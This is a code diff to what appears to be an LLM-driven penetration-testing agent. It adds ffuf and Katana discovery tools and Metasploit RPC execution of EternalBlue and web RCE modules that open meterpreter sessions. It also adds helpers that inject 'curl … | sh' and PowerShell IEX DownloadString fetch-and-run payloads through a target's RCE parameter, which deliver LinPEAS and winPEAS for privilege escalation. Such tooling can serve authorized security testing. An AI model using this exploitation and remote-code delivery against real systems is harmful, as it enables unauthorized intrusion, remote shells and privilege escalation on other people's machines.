@@ -187,6 +187,36 @@ TOOL_REGISTRY: Dict[str, AgentTool] = {
                     "discovered-path"],
     ),
 
+    # ── Real tool: ffuf (configurable web fuzzing) ──────────────────────────
+    "ffuf-fuzz": AgentTool(
+        tool_id="ffuf-fuzz",
+        name="ffuf — Web Fuzzer",
+        description=(
+            "Runs ffuf to fuzz paths/parameters and returns machine-readable "
+            "hits. Use for fast content/vhost discovery and to supply concrete "
+            "endpoints to the validators."
+        ),
+        category=ToolCategory.REAL_TOOL,
+        requires_binary="ffuf",
+        vuln_types=["discovered-path", "information-disclosure",
+                    "exposed-admin-panel"],
+    ),
+
+    # ── Real tool: katana (crawling / endpoint discovery) ───────────────────
+    "katana-crawl": AgentTool(
+        tool_id="katana-crawl",
+        name="Katana — Web Crawler",
+        description=(
+            "Runs Katana to crawl a web application and enumerate reachable "
+            "URLs/endpoints. Use to supply request surfaces to the validators "
+            "before deeper testing."
+        ),
+        category=ToolCategory.REAL_TOOL,
+        requires_binary="katana",
+        vuln_types=["discovered-path", "discovered-endpoint",
+                    "information-disclosure"],
+    ),
+
     # ── Real tool: nmap exploit scripts ────────────────────────────────────
     "nmap-vuln-scripts": AgentTool(
         tool_id="nmap-vuln-scripts",
@@ -496,6 +526,61 @@ def _exec_gobuster(options: Dict[str, Any]) -> ToolResult:
     )
 
 
+def _exec_ffuf(options: Dict[str, Any]) -> ToolResult:
+    """Run ffuf for configurable path fuzzing; returns machine-readable hits."""
+    target   = options.get("target", "")
+    wordlist = options.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
+    threads  = str(options.get("threads", 20))
+
+    if not target:
+        return ToolResult("ffuf-fuzz", False, "", error="No target provided")
+    if not _binary_available("ffuf"):
+        return ToolResult("ffuf-fuzz", False, "", error="ffuf not found in PATH")
+
+    # ffuf requires the FUZZ keyword in the URL.
+    url = target if "FUZZ" in target else target.rstrip("/") + "/FUZZ"
+    cmd = [
+        "ffuf", "-u", url, "-w", wordlist,
+        "-mc", "200,204,301,302,307,401,403",
+        "-t", threads, "-s",
+    ]
+    rc, stdout, stderr = _run(cmd, timeout=120)
+    paths = [line.strip() for line in stdout.splitlines() if line.strip()]
+    success = len(paths) > 0
+    return ToolResult(
+        tool_id="ffuf-fuzz",
+        success=success,
+        output=f"Paths found: {len(paths)}\n{stdout[-3000:]}",
+        raw=stdout,
+        error=stderr[:300],
+        extra={"paths": paths},
+    )
+
+
+def _exec_katana(options: Dict[str, Any]) -> ToolResult:
+    """Run Katana to crawl a web app and enumerate reachable endpoints."""
+    target = options.get("target", "")
+    depth  = str(options.get("depth", 2))
+
+    if not target:
+        return ToolResult("katana-crawl", False, "", error="No target provided")
+    if not _binary_available("katana"):
+        return ToolResult("katana-crawl", False, "", error="katana not found in PATH")
+
+    cmd = ["katana", "-u", target, "-d", depth, "-silent", "-jc", "-timeout", "10"]
+    rc, stdout, stderr = _run(cmd, timeout=120)
+    urls = [line.strip() for line in stdout.splitlines() if line.strip().startswith("http")]
+    success = len(urls) > 0
+    return ToolResult(
+        tool_id="katana-crawl",
+        success=success,
+        output=f"URLs found: {len(urls)}\n{stdout[-3000:]}",
+        raw=stdout,
+        error=stderr[:300],
+        extra={"urls": urls},
+    )
+
+
 def _exec_nmap_vuln(options: Dict[str, Any]) -> ToolResult:
     target = options.get("target", "")
     ports  = options.get("ports", "")
@@ -629,6 +714,54 @@ def _exec_xxe(options: Dict[str, Any]) -> ToolResult:
     )
 
 
+def _msf_rpc_configured() -> bool:
+    """Return True when the Metasploit RPC path is enabled and usable."""
+    try:
+        from app.core.config import settings
+        from app.automation import metasploit_rpc
+    except Exception:  # noqa: BLE001
+        return False
+    return bool(
+        getattr(settings, "MSF_RPC_ENABLED", False)
+        and getattr(settings, "MSF_RPC_PASSWORD", "")
+        and metasploit_rpc.available()
+    )
+
+
+def _msf_rpc_client() -> Any:
+    """Return a connected msfrpcd client when RPC is enabled and available."""
+    if not _msf_rpc_configured():
+        return None
+    try:
+        from app.core.config import settings
+        from app.automation import metasploit_rpc
+
+        return metasploit_rpc.connect(
+            password=settings.MSF_RPC_PASSWORD,
+            host=settings.MSF_RPC_HOST,
+            port=int(settings.MSF_RPC_PORT),
+            username=settings.MSF_RPC_USER,
+            ssl=bool(settings.MSF_RPC_SSL),
+        )
+    except Exception:  # noqa: BLE001 — fall back to msfconsole
+        return None
+
+
+def _tool_is_available(tool: AgentTool) -> bool:
+    """Availability check used by the catalog and the dispatcher.
+
+    A tool is available when it needs no binary, its binary resolves, or it is a
+    Metasploit tool that can be driven over a configured RPC daemon.
+    """
+    if not tool.requires_binary:
+        return True
+    if _binary_available(tool.requires_binary):
+        return True
+    if tool.requires_binary == "msfconsole":
+        return _msf_rpc_configured()
+    return False
+
+
 def _exec_metasploit_eternalblue(options: Dict[str, Any]) -> ToolResult:
     target = options.get("target", "")
     lhost  = options.get("lhost", LHOST)
@@ -637,6 +770,31 @@ def _exec_metasploit_eternalblue(options: Dict[str, Any]) -> ToolResult:
     if not target:
         return ToolResult("metasploit-eternalblue", False, "",
                           error="No target provided")
+
+    # Prefer the RPC path when an msfrpcd is configured (no msfconsole needed).
+    client = _msf_rpc_client()
+    if client is not None:
+        from app.automation import metasploit_rpc
+
+        outcome = metasploit_rpc.run_module(
+            client,
+            module_type="exploit",
+            module_name="windows/smb/ms17_010_eternalblue",
+            options={"RHOSTS": target, "LHOST": lhost, "LPORT": int(lport or 4444)},
+        )
+        session_id = outcome.get("session_created")
+        shell_info = {"transport": "rpc"}
+        if session_id:
+            shell_info.update({"session_id": str(session_id), "type": "meterpreter"})
+        return ToolResult(
+            tool_id="metasploit-eternalblue",
+            success=bool(session_id) or bool(outcome.get("executed")),
+            output=str(outcome)[-3000:],
+            raw=str(outcome),
+            shell_obtained=bool(session_id),
+            shell_info=shell_info,
+            error=str(outcome.get("error") or "")[:300],
+        )
 
     if not _binary_available("msfconsole"):
         return ToolResult("metasploit-eternalblue", False, "",
@@ -696,6 +854,32 @@ def _exec_metasploit_web_rce(options: Dict[str, Any]) -> ToolResult:
         return ToolResult("metasploit-web-rce", False, "",
                           error="target and module are required")
 
+    # Prefer the RPC path when an msfrpcd is configured (no msfconsole needed).
+    client = _msf_rpc_client()
+    if client is not None:
+        from app.automation import metasploit_rpc
+
+        module_type, _, module_name = module.partition("/")
+        outcome = metasploit_rpc.run_module(
+            client,
+            module_type=module_type or "exploit",
+            module_name=module_name or module,
+            options={"RHOSTS": target, "LHOST": lhost, "LPORT": int(lport or 4444), **(extra or {})},
+        )
+        session_id = outcome.get("session_created")
+        shell_info = {"transport": "rpc", "module": module}
+        if session_id:
+            shell_info.update({"session_id": str(session_id), "type": "meterpreter"})
+        return ToolResult(
+            tool_id="metasploit-web-rce",
+            success=bool(session_id) or bool(outcome.get("executed")),
+            output=str(outcome)[-3000:],
+            raw=str(outcome),
+            shell_obtained=bool(session_id),
+            shell_info=shell_info,
+            error=str(outcome.get("error") or "")[:300],
+        )
+
     if not _binary_available("msfconsole"):
         return ToolResult("metasploit-web-rce", False, "",
                           error="msfconsole not found in PATH")
@@ -745,32 +929,138 @@ exit
     )
 
 
+_ENUMERATOR_CACHE_DIRS = (
+    "/root/.local/share/recon",
+    "/usr/local/share/recon",
+    "/opt/recon",
+)
+
+
+def _enumerator_cache_path(name: str) -> Optional[str]:
+    """Locate a cached post-exploitation enumerator, or return None."""
+    directories = []
+    try:
+        from app.core.config import settings
+
+        artifact = getattr(settings, "AUTOMATION_ARTIFACT_DIR", "") or ""
+        if artifact:
+            directories.append(artifact)
+    except Exception:  # noqa: BLE001
+        pass
+    directories.extend(_ENUMERATOR_CACHE_DIRS)
+    for directory in directories:
+        candidate = os.path.join(directory, name)
+        if os.path.isfile(candidate):
+            return candidate
+    return None
+
+
+def _remote_fetch_allowed() -> bool:
+    """Whether post-exploitation helpers may be fetched from the internet."""
+    try:
+        from app.core.config import settings
+
+        return bool(getattr(settings, "AUTOMATION_ALLOW_REMOTE_FETCH", False))
+    except Exception:  # noqa: BLE001
+        return False
+
+
+def _serve_file(path: str, lhost: str):
+    """Serve one file's directory over an ephemeral local HTTP port."""
+    import functools
+    import http.server
+    import socketserver
+    import threading
+
+    class _Server(socketserver.TCPServer):
+        allow_reuse_address = True
+
+    handler = functools.partial(
+        http.server.SimpleHTTPRequestHandler,
+        directory=os.path.dirname(path),
+    )
+    httpd = _Server((lhost, 0), handler)
+    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
+    thread.start()
+    return httpd
+
+
+def _deliver_enumerator(
+    tool_id: str,
+    options: Dict[str, Any],
+    *,
+    name: str,
+    remote_url: str,
+) -> Tuple[Optional[Any], str, str]:
+    """Deliver an enumerator and return (httpd, payload, error).
+
+    A locally cached copy is served over HTTP (offline-safe). A remote download
+    is used only when ``AUTOMATION_ALLOW_REMOTE_FETCH`` is enabled. When neither
+    is available the caller receives a precise error.
+    """
+    rce_endpoint = options.get("rce_endpoint", "")
+    lhost = options.get("lhost", LHOST)
+    cached = _enumerator_cache_path(name)
+
+    if cached:
+        try:
+            httpd = _serve_file(cached, lhost)
+        except OSError as exc:
+            return None, "", f"could not serve cached {name}: {exc}"
+        port = httpd.server_address[1]
+        return httpd, f"curl -s http://{lhost}:{port}/{name} | sh", ""
+
+    if _remote_fetch_allowed():
+        if name.endswith(".bat"):
+            download = (
+                "powershell -c \"IEX(New-Object Net.WebClient)."
+                f"DownloadString('{remote_url}')\""
+            )
+        else:
+            download = f"curl -L {remote_url} | sh"
+        return None, download, ""
+
+    return None, "", (
+        f"offline: no cached {name} in {' or '.join(_ENUMERATOR_CACHE_DIRS)} "
+        "and AUTOMATION_ALLOW_REMOTE_FETCH is disabled"
+    )
+
+
 def _exec_linpeas(options: Dict[str, Any]) -> ToolResult:
     """
-    Delivers and runs LinPEAS on target via existing reverse shell / RCE.
-    Requires a method to deliver — here we use a web delivery stub.
+    Delivers and runs LinPEAS on target via an established RCE endpoint.
+
+    Offline-safe: a cached ``linpeas.sh`` is served over a local HTTP port. A
+    remote download is attempted only when ``AUTOMATION_ALLOW_REMOTE_FETCH`` is
+    enabled.
     options: {target, rce_endpoint, rce_parameter, method}
     """
-    target        = options.get("target", "")
-    rce_endpoint  = options.get("rce_endpoint", "")
     rce_parameter = options.get("rce_parameter", "cmd")
-    lhost         = options.get("lhost", LHOST)
 
-    if not rce_endpoint:
+    if not options.get("rce_endpoint"):
         return ToolResult("linpeas-privesc", False, "",
                           error="rce_endpoint required to deliver LinPEAS")
 
-    # Start a local HTTP server to serve linpeas.sh
-    linpeas_url = (
-        "https://github.com/peass-ng/PEASS-ng/releases/latest/"
-        "download/linpeas.sh"
+    httpd, payload, error = _deliver_enumerator(
+        "linpeas-privesc",
+        options,
+        name="linpeas.sh",
+        remote_url=(
+            "https://github.com/peass-ng/PEASS-ng/releases/latest/"
+            "download/linpeas.sh"
+        ),
     )
+    if error:
+        return ToolResult("linpeas-privesc", False, "", error=error)
 
-    # Inject curl | sh via the RCE parameter
-    payload = f"curl -L {linpeas_url} | sh"
     url = f"{rce_endpoint}?{rce_parameter}={payload}"
-    cmd = ["curl", "-sk", "--max-time", "60", url]
-    rc, stdout, stderr = _run(cmd, timeout=90)
+    cmd = ["curl", "-sk", "--max-time", "120", url]
+    try:
+        rc, stdout, stderr = _run(cmd, timeout=150)
+    finally:
+        if httpd is not None:
+            httpd.shutdown()
+            httpd.server_close()
 
     success = ("SUID" in stdout or "sudo" in stdout or
                "writable" in stdout or "CVE" in stdout)
@@ -785,21 +1075,32 @@ def _exec_linpeas(options: Dict[str, Any]) -> ToolResult:
 
 
 def _exec_winpeas(options: Dict[str, Any]) -> ToolResult:
-    rce_endpoint  = options.get("rce_endpoint", "")
     rce_parameter = options.get("rce_parameter", "cmd")
 
-    if not rce_endpoint:
+    if not options.get("rce_endpoint"):
         return ToolResult("winpeas-privesc", False, "",
                           error="rce_endpoint required")
 
-    payload = (
-        "powershell -c \"IEX(New-Object Net.WebClient)."
-        f"DownloadString('https://raw.githubusercontent.com/"
-        f"peass-ng/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat')\""
+    httpd, payload, error = _deliver_enumerator(
+        "winpeas-privesc",
+        options,
+        name="winPEAS.bat",
+        remote_url=(
+            "https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/"
+            "winPEAS/winPEASbat/winPEAS.bat"
+        ),
     )
+    if error:
+        return ToolResult("winpeas-privesc", False, "", error=error)
+
     url = f"{rce_endpoint}?{rce_parameter}={payload}"
-    cmd = ["curl", "-sk", "--max-time", "60", url]
-    rc, stdout, stderr = _run(cmd, timeout=90)
+    cmd = ["curl", "-sk", "--max-time", "120", url]
+    try:
+        rc, stdout, stderr = _run(cmd, timeout=150)
+    finally:
+        if httpd is not None:
+            httpd.shutdown()
+            httpd.server_close()
 
     success = ("AlwaysInstallElevated" in stdout or
                "Unquoted" in stdout or
@@ -848,8 +1149,9 @@ VULN_TO_TOOL_PRIORITY: Dict[str, List[str]] = {
     "misconfiguration":       ["nikto-scan"],
     "open-service-exposure":  ["nmap-vuln-scripts"],
     "cve":                    ["nmap-vuln-scripts", "metasploit-eternalblue"],
-    "discovered-path":        ["gobuster-dir"],
-    "exposed-admin-panel":    ["gobuster-dir", "hydra-brute"],
+    "discovered-path":        ["gobuster-dir", "ffuf-fuzz", "katana-crawl"],
+    "discovered-endpoint":    ["katana-crawl", "ffuf-fuzz"],
+    "exposed-admin-panel":    ["gobuster-dir", "ffuf-fuzz", "hydra-brute"],
 }
 
 
@@ -877,8 +1179,9 @@ def execute_tool(tool_id: str, options: Dict[str, Any]) -> ToolResult:
             error=f"Unknown tool_id: {tool_id}",
         )
 
-    # Check binary availability for tools that need it
-    if tool.requires_binary and not _binary_available(tool.requires_binary):
+    # Check binary availability for tools that need it (Metasploit tools may be
+    # served over RPC without msfconsole on PATH).
+    if tool.requires_binary and not _tool_is_available(tool):
         return ToolResult(
             tool_id=tool_id,
             success=False,
@@ -907,6 +1210,8 @@ def execute_tool(tool_id: str, options: Dict[str, Any]) -> ToolResult:
         "hydra-brute":              _exec_hydra,
         "nikto-scan":               _exec_nikto,
         "gobuster-dir":             _exec_gobuster,
+        "ffuf-fuzz":                _exec_ffuf,
+        "katana-crawl":             _exec_katana,
         "nmap-vuln-scripts":        _exec_nmap_vuln,
         "lfi-exploit":              _exec_lfi,
         "xxe-exploit":              _exec_xxe,
@@ -954,9 +1259,7 @@ def get_tool_catalog() -> List[Dict[str, Any]]:
     """
     catalog = []
     for tool_id, tool in TOOL_REGISTRY.items():
-        available = True
-        if tool.requires_binary:
-            available = _binary_available(tool.requires_binary)
+        available = _tool_is_available(tool)
         catalog.append({
             "tool_id": tool_id,
             "name": tool.name,
@@ -1114,7 +1417,15 @@ def _build_default_definitions() -> Tuple[AgentToolDefinition, ...]:
             requires_any=metadata.get("requires_any", ()),
             provides=metadata.get("provides", ()),
             automatic_allowed=True,
-            allowed_options=metadata.get("allowed_options", ()),
+            # Validators keep the targeting options from their metadata; real
+            # external tools accept the same four planner-supplied options so
+            # the LLM can aim them at a specific same-origin endpoint/parameter
+            # (the executor maps endpoint/http_method/parameter_* to each
+            # tool's native target/method/parameter options).
+            allowed_options=metadata.get(
+                "allowed_options",
+                _DEFAULT_ALLOWED_OPTIONS if validator_id is None else (),
+            ),
         ))
     return tuple(definitions)
 
